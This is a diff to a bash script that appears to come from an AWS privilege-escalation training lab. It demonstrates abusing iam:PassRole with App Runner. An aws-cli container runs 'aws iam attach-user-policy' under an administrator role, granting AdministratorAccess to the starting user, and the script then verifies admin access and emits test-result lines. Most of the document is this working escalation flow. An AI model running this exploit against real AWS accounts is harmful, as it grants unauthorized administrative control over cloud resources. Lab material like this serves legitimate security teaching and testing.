@@ -152,7 +152,12 @@ echo "Target Role ARN: $TARGET_ROLE_ARN"
 echo "This role will be passed to the App Runner service (iam:PassRole)"
 echo ""
 
-# Create the service configuration JSON
+# Create the service configuration JSON.
+# Image: aws-cli — ENTRYPOINT is "aws", so StartCommand becomes args to the aws binary.
+# The container runs "aws iam attach-user-policy ..." with the instance role's credentials,
+# attaches AdministratorAccess to the starting user, then exits. App Runner will mark
+# the service CREATE_FAILED because the container exited, but the policy attachment
+# already happened — that's the intended exploit flow.
 SERVICE_CONFIG=$(cat <<'EOF'
 {
   "ServiceName": "APP_RUNNER_SERVICE_NAME_PLACEHOLDER",
@@ -188,8 +193,8 @@ echo -e "${YELLOW}Step 6: Creating App Runner service with admin role${NC}"
 use_starting_creds
 echo "This is the privilege escalation vector - the service will:"
 echo "  1. Run with the target role's permissions (Administrator)"
-echo "  2. Execute a StartCommand that grants us admin access"
-echo "  3. Attach AdministratorAccess policy to our user"
+echo "  2. Execute StartCommand: aws iam attach-user-policy ..."
+echo "  3. Exit after the command — App Runner marks CREATE_FAILED, but the policy is already attached"
 echo ""
 
 # Save the JSON to a temporary file
@@ -219,21 +224,21 @@ echo ""
 # Clean up temp file
 rm -f /tmp/apprunner-config.json
 
-# [OBSERVATION] Step 7: Wait for App Runner service to start
-echo -e "${YELLOW}Step 7: Waiting for App Runner service to start and execute${NC}"
+# [OBSERVATION] Step 7: Wait for App Runner service to provision and execute
+echo -e "${YELLOW}Step 7: Waiting for App Runner service to provision and execute${NC}"
 use_readonly_creds
 echo "This may take 3-5 minutes as App Runner:"
 echo "  - Downloads the container image"
-echo "  - Starts the service"
-echo "  - Executes the StartCommand (which grants us admin)"
+echo "  - Provisions an instance"
+echo "  - Runs StartCommand: aws iam attach-user-policy ..."
+echo "  - Container exits after the command (expected — policy is already attached)"
 echo ""
 
-MAX_WAIT=400  # 6-7 minutes
+MAX_WAIT=600  # 10 minutes
 WAIT_TIME=0
-SERVICE_RUNNING=false
+COMMAND_EXECUTED=false
 
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
-    # Check service status
     SERVICE_STATUS=$(aws apprunner describe-service \
         --region $AWS_REGION \
         --service-arn "$SERVICE_ARN" \
@@ -243,21 +248,26 @@ while [ $WAIT_TIME -lt $MAX_WAIT ]; do
     echo "Service status: $SERVICE_STATUS (waited ${WAIT_TIME}s)"
 
     if [ "$SERVICE_STATUS" = "RUNNING" ]; then
-        echo -e "${GREEN}✓ App Runner service is running${NC}\n"
-        SERVICE_RUNNING=true
+        # Shouldn't happen with the aws-cli image (it exits), but handle it gracefully
+        echo -e "${GREEN}✓ Service reached RUNNING state${NC}\n"
+        COMMAND_EXECUTED=true
         break
-    elif [ "$SERVICE_STATUS" = "CREATE_FAILED" ] || [ "$SERVICE_STATUS" = "OPERATION_IN_PROGRESS" ]; then
-        echo "Status: $SERVICE_STATUS - continuing to wait..."
+    elif [ "$SERVICE_STATUS" = "CREATE_FAILED" ]; then
+        # Expected: the aws-cli container ran the IAM command and exited.
+        # App Runner marks the service failed because the container didn't stay up,
+        # but the attach-user-policy call already succeeded.
+        echo -e "${GREEN}✓ Container ran StartCommand and exited (CREATE_FAILED is expected here)${NC}\n"
+        COMMAND_EXECUTED=true
+        break
     fi
 
     sleep 15
     WAIT_TIME=$((WAIT_TIME + 15))
 done
 
-if [ "$SERVICE_RUNNING" = false ]; then
-    echo -e "${YELLOW}Warning: Service may not be fully running yet (status: $SERVICE_STATUS)${NC}"
-    echo "Proceeding to check if the privilege escalation completed..."
-    echo ""
+if [ "$COMMAND_EXECUTED" = false ]; then
+    echo -e "${RED}Error: Service never reached CREATE_FAILED or RUNNING within ${MAX_WAIT}s (last status: $SERVICE_STATUS)${NC}"
+    exit 1
 fi
 
 # Step 8: Wait for IAM policy propagation
@@ -267,20 +277,18 @@ echo "Waiting 15 seconds for IAM policy propagation..."
 sleep 15
 echo -e "${GREEN}✓ Policy propagation wait complete${NC}\n"
 
-# [OBSERVATION] Step 9: Verify admin access
+# [EXPLOIT] Step 9: Verify admin access using attacker credentials
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
-use_readonly_creds
-echo "Attempting to list IAM users..."
+use_starting_creds
+echo "Attempting to list IAM users with starting user credentials..."
 
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
 else
     echo -e "${RED}✗ Failed to list users${NC}"
-    echo "The service may still be starting up. Service ARN: $SERVICE_ARN"
-    echo "You can check the service status with:"
-    echo "  aws apprunner describe-service --service-arn $SERVICE_ARN --region $AWS_REGION"
+    echo "The App Runner StartCommand may not have executed yet. Service ARN: $SERVICE_ARN"
     exit 1
 fi
 echo ""
@@ -344,6 +352,10 @@ echo ""
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
 echo ""
+
+# Standardized test results output
+echo "TEST_RESULT:apprunner_001:SUCCESS"
+echo "TEST_DETAILS:apprunner_001:Successfully created App Runner service with admin role and captured CTF flag"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
